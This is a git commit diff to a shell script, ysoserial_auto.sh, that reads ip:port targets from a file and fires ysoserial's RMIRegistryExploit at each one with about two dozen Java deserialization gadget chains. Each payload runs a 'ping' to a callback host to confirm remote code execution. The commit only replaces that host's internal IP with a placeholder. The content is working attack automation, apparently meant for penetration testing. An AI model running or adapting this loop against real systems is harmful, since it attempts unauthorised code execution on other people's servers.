797a138165134437335e73ca28a70d7d28661f11
mattiapocci <49899160+mattiapocci@users.noreply.github.com>
2025-05-23 13:00:19 +0200

    Update ysoserial_auto.sh

--- ysoserial_auto.sh
+++ ysoserial_auto.sh
@@ -9,7 +9,7 @@ while IFS=: read -r ip port; do
   
   for payload in CommonsBeanutils1 CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6 CommonsCollections7 Groovy1 Jdk7u21 Hibernate1 Hibernate2 JSON1 JBossInterceptors1 JavassistWeld1 MozillaRhino1 MozillaRhino2 Spring1 Spring2 ROME Vaadin1 Click1 Clojure; do
     echo "    [+] Testing $payload"
-    timeout 10s java -cp ysoserialall.jar ysoserial.exploit.RMIRegistryExploit "$ip" "$port" "$payload" 'ping -c 1 10.169.44.150'
+    timeout 10s java -cp ysoserialall.jar ysoserial.exploit.RMIRegistryExploit "$ip" "$port" "$payload" 'ping -c 1 XXXXX'
   done
 
 done < "$TARGET_FILE"
